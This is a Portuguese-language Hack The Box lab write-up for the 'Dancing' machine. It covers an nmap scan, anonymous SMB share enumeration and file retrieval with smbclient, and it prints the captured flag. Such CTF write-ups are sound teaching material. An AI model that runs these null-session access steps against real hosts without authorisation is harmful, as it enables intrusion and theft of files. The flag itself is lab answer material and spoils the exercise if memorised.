# HTB - Starting Point - Dancing

🇺🇸 [English version](./README-dancing.md)

| Info        | Detalhe             |
|-------------|----------------------|
| Plataforma  | Hack The Box         |
| Track       | Starting Point       |
| Dificuldade | Muito Fácil          |
| OS          | Windows              |
| Status      | ✅ Resolvido          |

## Sumário
- [HTB - Starting Point - Dancing](#htb---starting-point---dancing)
  - [Sumário](#sumário)
  - [Recon](#recon)
  - [Enumeration](#enumeration)
  - [Exploitation](#exploitation)
  - [Flag](#flag)
  - [Lições aprendidas](#lições-aprendidas)

---

## Recon

Iniciei a máquina alvo pela plataforma do HTB, obtendo o endereço de IP do target:

**IP do alvo:** `10.129.160.246`

Em seguida, conectei na Pwnbox (máquina de ataque fornecida pelo HTB) e, através dela, me conectei na rede do target via VPN.

Rodei um scan com o **Nmap** para identificar portas e serviços abertos no alvo:

```bash
nmap 10.129.160.246
```

```
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman
```

As portas abertas (135, 139, 445) indicam que se trata de um host Windows rodando serviços de **SMB**, e a porta 5985 sugere que o WinRM também está disponível.

---

## Enumeration

Como a porta SMB (445) estava aberta, usei o `smbclient` para listar os shares disponíveis no alvo:

```bash
smbclient -L 10.129.160.246
```

Quando pedida a senha, apenas apertei Enter (sem credenciais):

```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
```

Quatro shares foram listados. `ADMIN$` e `C$` são shares administrativos padrão, `IPC$` é usado para comunicação entre processos, e `WorkShares` se destacou como um share customizado que valia a pena investigar.

Primeiro tentei acessar os shares administrativos, mas o acesso foi negado:

```bash
smbclient //10.129.160.246/ADMIN$
smbclient //10.129.160.246/C$
```

```
tree connect failed: NT_STATUS_ACCESS_DENIED
```

O `IPC$` conectou com sucesso, mas não ofereceu nada de interessante para navegar.

---

## Exploitation

Em seguida, conectei ao share `WorkShares`, que aceitou a conexão:

```bash
smbclient //10.129.160.246/WorkShares
```

```
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021
```

Dois diretórios de usuários estavam presentes. Naveguei primeiro para dentro de `Amy.J`:

```bash
smb: \> cd Amy.J\
smb: \Amy.J\> ls
```

```
  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021
```

Baixei o arquivo encontrado ali:

```bash
smb: \Amy.J\> get worknotes.txt
```

Depois voltei e verifiquei o segundo diretório, `James.P`:

```bash
smb: \Amy.J\> cd ..
smb: \> cd James.P\
smb: \James.P\> ls
```

```
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021
```

Um arquivo `flag.txt` estava presente. Fiz o download:

```bash
smb: \James.P\> get flag.txt
```

Encerrei a sessão SMB e li o arquivo localmente:

```bash
smb: \James.P\> exit
cat flag.txt
```

---

## Flag

```
5f61c10dffbc77a704d76016a22f1664
```

---

## Lições aprendidas

- Shares SMB muitas vezes podem ser enumerados e acessados com sessões nulas/anônimas (sem credenciais, apenas apertando Enter quando pedida a senha).
- Shares administrativos padrão (`ADMIN$`, `C$`) geralmente são restritos, mas shares customizados (como o `WorkShares` aqui) podem estar mal configurados permitindo acesso de leitura sem autenticação.
- Sempre navegue por todos os shares e subdiretórios disponíveis — arquivos deixados em pastas individuais de usuários (como `worknotes.txt` ou `flag.txt`) são uma forma comum de encontrar informações sensíveis ou loot.
- O shell interativo do `smbclient` se comporta de forma bem parecida com o FTP (`ls`, `cd`, `get`), tornando a navegação simples uma vez conectado.
